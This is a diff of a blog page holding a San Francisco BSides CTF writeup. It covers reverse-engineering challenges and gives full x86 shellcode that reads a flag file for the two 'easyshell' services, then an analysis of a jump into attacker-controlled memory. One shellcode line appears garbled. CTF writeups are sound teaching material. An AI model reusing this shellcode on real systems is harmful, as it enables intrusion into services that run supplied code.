@@ -1,16 +1,16 @@
 ---
 layout: page
 title: San Francisco BSides CTF Writeup
-excerpt: A quick writeup of San Francisco Bsides CTF
+category: note
 tags:
+  - post
   - ctf
   - infosec
-category: note
 ---
 
-<section id="outline-container-org462de6c" class="outline-2">
-<h2 id="org462de6c">Writeups</h2>
-<div class="outline-text-2" id="text-org462de6c">
+<section id="outline-container-org1acec95" class="outline-2">
+<h2 id="org1acec95">Writeups</h2>
+<div class="outline-text-2" id="text-org1acec95">
 <p>
 Because so many of these challenges don't have their answers published by their
 organizers after the event is settled, it's up to the community to put together
@@ -23,17 +23,17 @@ Here's a few of those.
 </div>
 
 
-<div id="outline-container-orgbdf3ae1" class="outline-3">
-<h3 id="orgbdf3ae1">NOP</h3>
-<div class="outline-text-3" id="text-orgbdf3ae1">
+<div id="outline-container-org35a5351" class="outline-3">
+<h3 id="org35a5351">NOP</h3>
+<div class="outline-text-3" id="text-org35a5351">
 <p>
-The <span class="verbatim">NOP</span> instruction is microcode for <span class="verbatim">xchg EAX, EAX</span>
+The <code>NOP</code> instruction is microcode for <code>xchg EAX, EAX</code>
 </p>
 </div>
 </div>
-<div id="outline-container-org6db90e1" class="outline-3">
-<h3 id="org6db90e1">easycap</h3>
-<div class="outline-text-3" id="text-org6db90e1">
+<div id="outline-container-orgdeb2d7c" class="outline-3">
+<h3 id="orgdeb2d7c">easycap</h3>
+<div class="outline-text-3" id="text-orgdeb2d7c">
 <p>
 This challenge doesn't include the flag in a string because it's spread out over
 multiple packets. You can easily extract the flag by 'following' a TCP stream in
@@ -42,12 +42,12 @@ your network packet capture software of choice.
 </div>
 </div>
 
-<div id="outline-container-org3ed73c8" class="outline-3">
-<h3 id="org3ed73c8">easy</h3>
-<div class="outline-text-3" id="text-org3ed73c8">
+<div id="outline-container-org8120d2b" class="outline-3">
+<h3 id="org8120d2b">easy</h3>
+<div class="outline-text-3" id="text-org8120d2b">
 <p>
 This challenge doesn't require you to perform any reverse engineering as the
-the flag is visible as a direct <span class="verbatim">.symstrtab</span> entry.
+the flag is visible as a direct <code>.symstrtab</code> entry.
 </p>
 
 <pre class="example">
@@ -57,9 +57,9 @@ FLAG:db2f62a36a018bce28e46d976e3f9864
 </div>
 </div>
 
-<div id="outline-container-orgf6f967f" class="outline-3">
-<h3 id="orgf6f967f">Skipper</h3>
-<div class="outline-text-3" id="text-orgf6f967f">
+<div id="outline-container-org390f34c" class="outline-3">
+<h3 id="org390f34c">Skipper</h3>
+<div class="outline-text-3" id="text-org390f34c">
 <p>
 In this challenge I'm going to use one of the best disassemblers available
 today: <a href="http://radare.org/r/">radare</a> . It is both free and contains many facilities for modifying
@@ -73,7 +73,7 @@ r2 /tmp/skipper64
 </pre>
 
 <p>
-Next, seek the read head to the <span class="verbatim">main</span> symbol and tap <code>V</code> key to bring yourself
+Next, seek the read head to the <code>main</code> symbol and tap <code>V</code> key to bring yourself
 into disassembly.
 </p>
 
@@ -152,14 +152,14 @@ the hostname, but let's be sure.
 </pre>
 
 <p>
-You can see it's calling <span class="verbatim">uname</span> here. Before you start changing your system's
+You can see it's calling <code>uname</code> here. Before you start changing your system's
 configuration to accommodate, first know it's not possible to set your hostname
 to this value.
 </p>
 
 <p>
 This means you are going to either have to use a debugger and manually change
-the <span class="verbatim">ZF</span>, <span class="verbatim">CF</span>, <span class="verbatim">OF</span> or other condition flags or patch up all of the <span class="verbatim">je</span>
+the <code>ZF</code>, <code>CF</code>, <code>OF</code> or other condition flags or patch up all of the <code>je</code>
 instructions.
 </p>
 
@@ -177,18 +177,18 @@ After this, run the binary and get the flag! <code>FLAG:f51579e9ca38ba87d71539a9
 </div>
 
 
-<div id="outline-container-orgfb93ffc" class="outline-3">
-<h3 id="orgfb93ffc"><span class="todo TODO">TODO</span> Skipper2</h3>
+<div id="outline-container-orgb38042c" class="outline-3">
+<h3 id="orgb38042c"><span class="todo TODO">TODO</span> Skipper2</h3>
 </div>
 
-<div id="outline-container-org1e4eff5" class="outline-3">
-<h3 id="org1e4eff5">Easyshell 1</h3>
-<div class="outline-text-3" id="text-org1e4eff5">
+<div id="outline-container-org056d8c4" class="outline-3">
+<h3 id="org056d8c4">Easyshell 1</h3>
+<div class="outline-text-3" id="text-org056d8c4">
 <p>
 Both of the easyshell puzzles are warmups who run any shellcode sent on the
 wire. However, you can't use some of the most common shellcode for spawning
-<span class="verbatim">/bin/sh</span> as there is no remote shell. This shellcode reads the file
-<span class="verbatim">/home/ctf/flag.txt</span>
+<code>/bin/sh</code> as there is no remote shell. This shellcode reads the file
+<code>/home/ctf/flag.txt</code>
 </p>
 
 <p>
@@ -196,110 +196,110 @@ Compile with <code>nasm -f bin flag.asm</code>
 </p>
 
 <div class="org-src-container">
-<pre class="src src-nasm"><span style="color: #0000FF;">BITS</span> <span style="color: #D0372D;">64</span>
-<span style="color: #0000FF;">section</span> <span style="color: #6434A3;">.text</span>
+<pre class="src src-nasm"><span style="color: #859900; font-weight: bold;">BITS</span> <span style="color: #6c71c4;">64</span>
+<span style="color: #859900; font-weight: bold;">section</span> <span style="color: #b58900;">.text</span>
 
-<span style="color: #006699;">_start</span>:
-  <span style="color: #006FE0;">xor</span>    <span style="color: #BA36A5;">eax</span>,<span style="color: #BA36A5;">eax</span>
-  <span style="color: #006FE0;">xor</span>    <span style="color: #BA36A5;">ebx</span>,<span style="color: #BA36A5;">ebx</span>
-  <span style="color: #006FE0;">xor</span>    <span style="color: #BA36A5;">ecx</span>,<span style="color: #BA36A5;">ecx</span>
-  <span style="color: #006FE0;">xor</span>    <span style="color: #BA36A5;">edx</span>,<span style="color: #BA36A5;">edx</span>
-  <span style="color: #006FE0;">jmp</span>    read
+<span style="color: #268bd2;">_start</span>:
+  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">eax</span>,<span style="color: #268bd2;">eax</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">ebx</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ecx</span>,<span style="color: #268bd2;">ecx</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">edx</span>,<span style="color: #268bd2;">edx</span>
+  <span style="color: #657b83; font-weight: bold;">jmp</span>    read
 
-<span style="color: #006699;">one</span>:
-  <span style="color: #006FE0;">pop</span>    <span style="color: #BA36A5;">rbx</span>
-  <span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">al</span>,<span style="color: #D0372D;">0x5</span>
-  <span style="color: #006FE0;">xor</span>    <span style="color: #BA36A5;">ecx</span>,<span style="color: #BA36A5;">ecx</span>
-  <span style="color: #006FE0;">int</span>    <span style="color: #D0372D;">0x80</span>
-  <span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">esi</span>,<span style="color: #BA36A5;">eax</span>
-  <span style="color: #006FE0;">jmp</span>    read
+<span style="color: #268bd2;">one</span>:
+  <span style="color: #657b83; font-weight: bold;">pop</span>    <span style="color: #268bd2;">rbx</span>
+  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">al</span>,<span style="color: #6c71c4;">0x5</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ecx</span>,<span style="color: #268bd2;">ecx</span>
+  <span style="color: #657b83; font-weight: bold;">int</span>    <span style="color: #6c71c4;">0x80</span>
+  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">esi</span>,<span style="color: #268bd2;">eax</span>
+  <span style="color: #657b83; font-weight: bold;">jmp</span>    read
 
-<span style="color: #006699;">exit</span>:
-  <span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">al</span>,<span style="color: #D0372D;">0x1</span>
-  <span style="color: #006FE0;">xor</span>    <span style="color: #BA36A5;">ebx</span>,<span style="color: #BA36A5;">ebx</span>
-  <span style="color: #006FE0;">int</span>    <span style="color: #D0372D;">0x80</span>
+<span style="color: #268bd2;">exit</span>:
+  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">al</span>,<span style="color: #6c71c4;">0x1</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">ebx</span>
+  <span style="color: #657b83; font-weight: bold;">int</span>    <span style="color: #6c71c4;">0x80</span>
 
-<span style="color: #006699;">read</span>:
-  <span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">ebx</span>,<span style="color: #BA36A5;">esi</span>
-  <span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">al</span>,<span style="color: #D0372D;">0x3</span>
-  <span style="color: #006FE0;">sub</span>    <span style="color: #BA36A5;">esp</span>,<span style="color: #D0372D;">0x1</span>
-  <span style="color: #006FE0;">lea</span>    <span style="color: #BA36A5;">ecx</span>,<span style="color: #707183;">[</span><span style="color: #BA36A5;">rsp</span><span style="color: #707183;">]</span>
-  <span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">dl</span>,<span style="color: #D0372D;">0x1</span>
-  <span style="color: #006FE0;">int</span>    <span style="color: #D0372D;">0x80</span>
-  <span style="color: #006FE0;">xor</span>    <span style="color: #BA36A5;">ebx</span>,<span style="color: #BA36A5;">ebx</span>
-  <span style="color: #006FE0;">cmp</span>    <span style="color: #BA36A5;">ebx</span>,<span style="color: #BA36A5;">eax</span>
-  <span style="color: #006FE0;">je</span>     exit
-  <span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">al</span>,<span style="color: #D0372D;">0x4</span>
-  <span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">bl</span>,<span style="color: #D0372D;">0x1</span>
-  <span style="color: #006FE0;">mov</span>    d
-  <span style="color: #006FE0;">int</span>    <span style="color: #D0372D;">0x80</span>
-  <span style="color: #006FE0;">add</span>    <span style="color: #BA36A5;">esp</span>,<span style="color: #D0372D;">0x1</span>
-  <span style="color: #006FE0;">jmp</span>    read
+<span style="color: #268bd2;">read</span>:
+  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">esi</span>
+  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">al</span>,<span style="color: #6c71c4;">0x3</span>
+  <span style="color: #657b83; font-weight: bold;">sub</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x1</span>
+  <span style="color: #657b83; font-weight: bold;">lea</span>    <span style="color: #268bd2;">ecx</span>,<span style="color: #2aa198;">[</span><span style="color: #268bd2;">rsp</span><span style="color: #2aa198;">]</span>
+  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">dl</span>,<span style="color: #6c71c4;">0x1</span>
+  <span style="color: #657b83; font-weight: bold;">int</span>    <span style="color: #6c71c4;">0x80</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">ebx</span>
+  <span style="color: #657b83; font-weight: bold;">cmp</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #268bd2;">eax</span>
+  <span style="color: #657b83; font-weight: bold;">je</span>     exit
+  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">al</span>,<span style="color: #6c71c4;">0x4</span>
+  <span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">bl</span>,<span style="color: #6c71c4;">0x1</span>
+  <span style="color: #657b83; font-weight: bold;">mov</span>    d
+  <span style="color: #657b83; font-weight: bold;">int</span>    <span style="color: #6c71c4;">0x80</span>
+  <span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x1</span>
+  <span style="color: #657b83; font-weight: bold;">jmp</span>    read
 
-<span style="color: #006699;">two</span>:
-  <span style="color: #006FE0;">call</span>   one
-  <span style="color: #006699;">string</span>: <span style="color: #006FE0;">db</span> <span style="color: #008000;">"/home/ctf/flag.txt"</span>
+<span style="color: #268bd2;">two</span>:
+  <span style="color: #657b83; font-weight: bold;">call</span>   one
+  <span style="color: #268bd2;">string</span>: <span style="color: #657b83; font-weight: bold;">db</span> <span style="color: #2aa198;">"/home/ctf/flag.txt"</span>
 </pre>
 </div>
 </div>
 </div>
 
 
-<div id="outline-container-orgdf06a67" class="outline-3">
-<h3 id="orgdf06a67">Easyshell 2</h3>
-<div class="outline-text-3" id="text-orgdf06a67">
+<div id="outline-container-org3dd6e48" class="outline-3">
+<h3 id="org3dd6e48">Easyshell 2</h3>
+<div class="outline-text-3" id="text-org3dd6e48">
 <p>
 Like the prior challenge, you simply just need to write some code to read out
 a file. I used the following.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-nasm"><span style="color: #0000FF;">BITS</span> <span style="color: #D0372D;">64</span>
-<span style="color: #0000FF;">section</span> <span style="color: #6434A3;">.text</span>
-<span style="color: #006699;">_start</span>:
-  <span style="color: #006FE0;">jmp</span> _<span style="color: #006FE0;">push</span>_filename
+<pre class="src src-nasm"><span style="color: #859900; font-weight: bold;">BITS</span> <span style="color: #6c71c4;">64</span>
+<span style="color: #859900; font-weight: bold;">section</span> <span style="color: #b58900;">.text</span>
+<span style="color: #268bd2;">_start</span>:
+  <span style="color: #657b83; font-weight: bold;">jmp</span> _<span style="color: #657b83; font-weight: bold;">push</span>_filename
 
-<span style="color: #006699;">_readfile</span>:
-  <span style="color: #8D8D84; font-style: italic;">; syscall open file</span>
-  <span style="color: #006FE0;">pop</span> <span style="color: #BA36A5;">rdi</span> <span style="color: #8D8D84; font-style: italic;">; pop path value</span>
-  <span style="color: #006FE0;">xor</span> <span style="color: #BA36A5;">rax</span>, <span style="color: #BA36A5;">rax</span>
-  <span style="color: #006FE0;">add</span> <span style="color: #BA36A5;">al</span>, <span style="color: #D0372D;">2</span>
-  <span style="color: #006FE0;">xor</span> <span style="color: #BA36A5;">rsi</span>, <span style="color: #BA36A5;">rsi</span> <span style="color: #8D8D84; font-style: italic;">; set O_RDONLY flag</span>
-  <span style="color: #006FE0;">syscall</span>
+<span style="color: #268bd2;">_readfile</span>:
+  <span style="color: #93a1a1;">; syscall open file</span>
+  <span style="color: #657b83; font-weight: bold;">pop</span> <span style="color: #268bd2;">rdi</span> <span style="color: #93a1a1;">; pop path value</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rax</span>, <span style="color: #268bd2;">rax</span>
+  <span style="color: #657b83; font-weight: bold;">add</span> <span style="color: #268bd2;">al</span>, <span style="color: #6c71c4;">2</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rsi</span>, <span style="color: #268bd2;">rsi</span> <span style="color: #93a1a1;">; set O_RDONLY flag</span>
+  <span style="color: #657b83; font-weight: bold;">syscall</span>
 
-  <span style="color: #8D8D84; font-style: italic;">; syscall read file</span>
-  <span style="color: #006FE0;">sub</span> <span style="color: #BA36A5;">sp</span>, <span style="color: #D0372D;">0xfff</span>
-  <span style="color: #006FE0;">lea</span> <span style="color: #BA36A5;">rsi</span>, <span style="color: #707183;">[</span><span style="color: #BA36A5;">rsp</span><span style="color: #707183;">]</span>
-  <span style="color: #006FE0;">mov</span> <span style="color: #BA36A5;">rdi</span>, <span style="color: #BA36A5;">rax</span>
-  <span style="color: #006FE0;">xor</span> <span style="color: #BA36A5;">rdx</span>, <span style="color: #BA36A5;">rdx</span>
-  <span style="color: #006FE0;">mov</span> <span style="color: #BA36A5;">dx</span>, <span style="color: #D0372D;">0xfff</span><span style="color: #8D8D84; font-style: italic;">; size to read</span>
-  <span style="color: #006FE0;">xor</span> <span style="color: #BA36A5;">rax</span>, <span style="color: #BA36A5;">rax</span>
-  <span style="color: #006FE0;">syscall</span>
+  <span style="color: #93a1a1;">; syscall read file</span>
+  <span style="color: #657b83; font-weight: bold;">sub</span> <span style="color: #268bd2;">sp</span>, <span style="color: #6c71c4;">0xfff</span>
+  <span style="color: #657b83; font-weight: bold;">lea</span> <span style="color: #268bd2;">rsi</span>, <span style="color: #2aa198;">[</span><span style="color: #268bd2;">rsp</span><span style="color: #2aa198;">]</span>
+  <span style="color: #657b83; font-weight: bold;">mov</span> <span style="color: #268bd2;">rdi</span>, <span style="color: #268bd2;">rax</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rdx</span>, <span style="color: #268bd2;">rdx</span>
+  <span style="color: #657b83; font-weight: bold;">mov</span> <span style="color: #268bd2;">dx</span>, <span style="color: #6c71c4;">0xfff</span><span style="color: #93a1a1;">; size to read</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rax</span>, <span style="color: #268bd2;">rax</span>
+  <span style="color: #657b83; font-weight: bold;">syscall</span>
 
-  <span style="color: #8D8D84; font-style: italic;">; syscall write to stdout</span>
-  <span style="color: #006FE0;">xor</span> <span style="color: #BA36A5;">rdi</span>, <span style="color: #BA36A5;">rdi</span>
-  <span style="color: #006FE0;">add</span> <span style="color: #BA36A5;">dil</span>, <span style="color: #D0372D;">1</span> <span style="color: #8D8D84; font-style: italic;">; set stdout fd = 1</span>
-  <span style="color: #006FE0;">mov</span> <span style="color: #BA36A5;">rdx</span>, <span style="color: #BA36A5;">rax</span>
-  <span style="color: #006FE0;">xor</span> <span style="color: #BA36A5;">rax</span>, <span style="color: #BA36A5;">rax</span>
-  <span style="color: #006FE0;">add</span> <span style="color: #BA36A5;">al</span>, <span style="color: #D0372D;">1</span>
-  <span style="color: #006FE0;">syscall</span>
+  <span style="color: #93a1a1;">; syscall write to stdout</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rdi</span>, <span style="color: #268bd2;">rdi</span>
+  <span style="color: #657b83; font-weight: bold;">add</span> <span style="color: #268bd2;">dil</span>, <span style="color: #6c71c4;">1</span> <span style="color: #93a1a1;">; set stdout fd = 1</span>
+  <span style="color: #657b83; font-weight: bold;">mov</span> <span style="color: #268bd2;">rdx</span>, <span style="color: #268bd2;">rax</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rax</span>, <span style="color: #268bd2;">rax</span>
+  <span style="color: #657b83; font-weight: bold;">add</span> <span style="color: #268bd2;">al</span>, <span style="color: #6c71c4;">1</span>
+  <span style="color: #657b83; font-weight: bold;">syscall</span>
 
-  <span style="color: #8D8D84; font-style: italic;">; syscall exit</span>
-  <span style="color: #006FE0;">xor</span> <span style="color: #BA36A5;">rax</span>, <span style="color: #BA36A5;">rax</span>
-  <span style="color: #006FE0;">add</span> <span style="color: #BA36A5;">al</span>, <span style="color: #D0372D;">60</span>
-  <span style="color: #006FE0;">syscall</span>
+  <span style="color: #93a1a1;">; syscall exit</span>
+  <span style="color: #657b83; font-weight: bold;">xor</span> <span style="color: #268bd2;">rax</span>, <span style="color: #268bd2;">rax</span>
+  <span style="color: #657b83; font-weight: bold;">add</span> <span style="color: #268bd2;">al</span>, <span style="color: #6c71c4;">60</span>
+  <span style="color: #657b83; font-weight: bold;">syscall</span>
 
-_<span style="color: #006FE0;">push</span>_filename:
-  <span style="color: #006FE0;">call</span> _readfile
-  <span style="color: #006699;">path</span>: <span style="color: #006FE0;">db</span> <span style="color: #008000;">"/home/ctf/flag.txt"</span>
+_<span style="color: #657b83; font-weight: bold;">push</span>_filename:
+  <span style="color: #657b83; font-weight: bold;">call</span> _readfile
+  <span style="color: #268bd2;">path</span>: <span style="color: #657b83; font-weight: bold;">db</span> <span style="color: #2aa198;">"/home/ctf/flag.txt"</span>
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org38bd5a3" class="outline-3">
-<h3 id="org38bd5a3">i-am-the-shortest</h3>
-<div class="outline-text-3" id="text-org38bd5a3">
+<div id="outline-container-org59d0972" class="outline-3">
+<h3 id="org59d0972">i-am-the-shortest</h3>
+<div class="outline-text-3" id="text-org59d0972">
 <p>
 This is a challenge designed to mimic the common constraints exploit authors must deal with.
 </p>
@@ -314,58 +314,58 @@ There's undoubtedly dozens of ways the problem can be solved, I've successfully 
 </p>
 </div>
 
-<div id="outline-container-org09420ff" class="outline-4">
-<h4 id="org09420ff">Direct System Call</h4>
-<div class="outline-text-4" id="text-org09420ff">
+<div id="outline-container-orge104869" class="outline-4">
+<h4 id="orge104869">Direct System Call</h4>
+<div class="outline-text-4" id="text-orge104869">
 <p>
-Beginning at <span class="verbatim">0x80487ef</span>, the core code runs:
+Beginning at <code>0x80487ef</code>, the core code runs:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-nasm"><span style="color: #006FE0;">call</span>   <span style="color: #D0372D;">80486db</span> &lt;get_flag&gt; <span style="color: #8D8D84; font-style: italic;">;; where the 'flag' is gotten</span>
-<span style="color: #006FE0;">add</span>    <span style="color: #BA36A5;">esp</span>,<span style="color: #D0372D;">0x10</span>
-<span style="color: #006FE0;">lea</span>    <span style="color: #BA36A5;">eax</span>,<span style="color: #707183;">[</span><span style="color: #BA36A5;">ebp</span>-<span style="color: #D0372D;">0x8c</span><span style="color: #707183;">]</span>
-<span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">esi</span>,<span style="color: #BA36A5;">eax</span>
-<span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">ebx</span>,<span style="color: #D0372D;">0x1</span>
-<span style="color: #006FE0;">sub</span>    <span style="color: #BA36A5;">esp</span>,<span style="color: #D0372D;">0x8</span>
-<span style="color: #006FE0;">lea</span>    <span style="color: #BA36A5;">eax</span>,<span style="color: #707183;">[</span><span style="color: #BA36A5;">ebp</span>-<span style="color: #D0372D;">0x8c</span><span style="color: #707183;">]</span>
-<span style="color: #006FE0;">push</span>   <span style="color: #BA36A5;">eax</span>
-<span style="color: #006FE0;">push</span>   <span style="color: #D0372D;">0x8048946</span>
-<span style="color: #006FE0;">call</span>   <span style="color: #D0372D;">8048500</span> <a href="mailto:printf%40plt">&lt;printf@plt&gt;</a>
-<span style="color: #006FE0;">add</span>    <span style="color: #BA36A5;">esp</span>,<span style="color: #D0372D;">0x10</span>
-<span style="color: #006FE0;">sub</span>    <span style="color: #BA36A5;">esp</span>,<span style="color: #D0372D;">0xc</span>
-<span style="color: #006FE0;">push</span>   <span style="color: #D0372D;">0x8048964</span>
-<span style="color: #006FE0;">call</span>   <span style="color: #D0372D;">8048550</span> <a href="mailto:puts%40plt">&lt;puts@plt&gt;</a>
-<span style="color: #006FE0;">add</span>    <span style="color: #BA36A5;">esp</span>,<span style="color: #D0372D;">0x10</span>
-<span style="color: #006FE0;">sub</span>    <span style="color: #BA36A5;">esp</span>,<span style="color: #D0372D;">0x4</span>
-<span style="color: #006FE0;">push</span>   <span style="color: #D0372D;">0x5</span>
-<span style="color: #006FE0;">push</span>   <span style="color: #6434A3;">DWORD</span> PTR <span style="color: #707183;">[</span><span style="color: #BA36A5;">ebp</span>-<span style="color: #D0372D;">0x94</span><span style="color: #707183;">]</span>
-<span style="color: #006FE0;">push</span>   <span style="color: #D0372D;">0x0</span>
-<span style="color: #006FE0;">call</span>   <span style="color: #D0372D;">80484f0</span> <a href="mailto:read%40plt">&lt;read@plt&gt;</a> <span style="color: #8D8D84; font-style: italic;">;; where `read` is called</span>
-<span style="color: #006FE0;">add</span>    <span style="color: #BA36A5;">esp</span>,<span style="color: #D0372D;">0x10</span>
-<span style="color: #006FE0;">mov</span>    <span style="color: #6434A3;">DWORD</span> PTR <span style="color: #707183;">[</span><span style="color: #BA36A5;">ebp</span>-<span style="color: #D0372D;">0x90</span><span style="color: #707183;">]</span>,<span style="color: #BA36A5;">eax</span>
-<span style="color: #006FE0;">mov</span>    <span style="color: #BA36A5;">edx</span>,<span style="color: #D0372D;">0xff</span>
-<span style="color: #006FE0;">cmp</span>    <span style="color: #6434A3;">DWORD</span> PTR <span style="color: #707183;">[</span><span style="color: #BA36A5;">ebp</span>-<span style="color: #D0372D;">0x90</span><span style="color: #707183;">]</span>,<span style="color: #D0372D;">0x5</span>
-<span style="color: #006FE0;">ja</span>     <span style="color: #D0372D;">804885c</span> &lt;main+<span style="color: #D0372D;">0x10c</span>&gt;
-<span style="color: #006FE0;">jmp</span>    <span style="color: #6434A3;">DWORD</span> PTR <span style="color: #707183;">[</span><span style="color: #BA36A5;">ebp</span>-<span style="color: #D0372D;">0x94</span><span style="color: #707183;">]</span> <span style="color: #8D8D84; font-style: italic;">;; here is where it finally jumps in</span>
+<pre class="src src-nasm"><span style="color: #657b83; font-weight: bold;">call</span>   <span style="color: #6c71c4;">80486db</span> &lt;get_flag&gt; <span style="color: #93a1a1;">;; where the 'flag' is gotten</span>
+<span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x10</span>
+<span style="color: #657b83; font-weight: bold;">lea</span>    <span style="color: #268bd2;">eax</span>,<span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x8c</span><span style="color: #2aa198;">]</span>
+<span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">esi</span>,<span style="color: #268bd2;">eax</span>
+<span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">ebx</span>,<span style="color: #6c71c4;">0x1</span>
+<span style="color: #657b83; font-weight: bold;">sub</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x8</span>
+<span style="color: #657b83; font-weight: bold;">lea</span>    <span style="color: #268bd2;">eax</span>,<span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x8c</span><span style="color: #2aa198;">]</span>
+<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #268bd2;">eax</span>
+<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #6c71c4;">0x8048946</span>
+<span style="color: #657b83; font-weight: bold;">call</span>   <span style="color: #6c71c4;">8048500</span> <a href="mailto:printf%40plt">&lt;printf@plt&gt;</a>
+<span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x10</span>
+<span style="color: #657b83; font-weight: bold;">sub</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0xc</span>
+<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #6c71c4;">0x8048964</span>
+<span style="color: #657b83; font-weight: bold;">call</span>   <span style="color: #6c71c4;">8048550</span> <a href="mailto:puts%40plt">&lt;puts@plt&gt;</a>
+<span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x10</span>
+<span style="color: #657b83; font-weight: bold;">sub</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x4</span>
+<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #6c71c4;">0x5</span>
+<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #b58900;">DWORD</span> PTR <span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x94</span><span style="color: #2aa198;">]</span>
+<span style="color: #657b83; font-weight: bold;">push</span>   <span style="color: #6c71c4;">0x0</span>
+<span style="color: #657b83; font-weight: bold;">call</span>   <span style="color: #6c71c4;">80484f0</span> <a href="mailto:read%40plt">&lt;read@plt&gt;</a> <span style="color: #93a1a1;">;; where `read` is called</span>
+<span style="color: #657b83; font-weight: bold;">add</span>    <span style="color: #268bd2;">esp</span>,<span style="color: #6c71c4;">0x10</span>
+<span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #b58900;">DWORD</span> PTR <span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x90</span><span style="color: #2aa198;">]</span>,<span style="color: #268bd2;">eax</span>
+<span style="color: #657b83; font-weight: bold;">mov</span>    <span style="color: #268bd2;">edx</span>,<span style="color: #6c71c4;">0xff</span>
+<span style="color: #657b83; font-weight: bold;">cmp</span>    <span style="color: #b58900;">DWORD</span> PTR <span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x90</span><span style="color: #2aa198;">]</span>,<span style="color: #6c71c4;">0x5</span>
+<span style="color: #657b83; font-weight: bold;">ja</span>     <span style="color: #6c71c4;">804885c</span> &lt;main+<span style="color: #268bd2; font-weight: bold;">0x10c</span>&gt;
+<span style="color: #657b83; font-weight: bold;">jmp</span>    <span style="color: #b58900;">DWORD</span> PTR <span style="color: #2aa198;">[</span><span style="color: #268bd2;">ebp</span>-<span style="color: #268bd2; font-weight: bold;">0x94</span><span style="color: #2aa198;">]</span> <span style="color: #93a1a1;">;; here is where it finally jumps in</span>
 </pre>
 </div>
 
 <p>
-The last line is where this <span class="verbatim">jmp</span> to attacker-controlled memory actually
+The last line is where this <code>jmp</code> to attacker-controlled memory actually
 occurs.
 </p>
 
 <p>
 Although the above code snippet doesn't show it directly, it's also important
-to note that the address of the flag read remains stored in <span class="verbatim">ESI</span> when the <code>jmp
+to note that the address of the flag read remains stored in <code>ESI</code> when the <code>jmp
     [ebp-0x94]</code> occurs.
 </p>
 
 <p>
-In tandem with the fact that <span class="verbatim">read</span> returns the length of the value read in
-<span class="verbatim">EAX</span>, you can abuse this by entering a system-call. (Remember, Linux calling
-convention dictates that x86 system call's interrupt vector is given in <span class="verbatim">EAX</span>)
+In tandem with the fact that <code>read</code> returns the length of the value read in
+<code>EAX</code>, you can abuse this by entering a system-call. (Remember, Linux calling
+convention dictates that x86 system call's interrupt vector is given in <code>EAX</code>)
 </p>
 
 <p>
@@ -375,7 +375,7 @@ for you. This leaves you with only two tasks:
 </p>
 
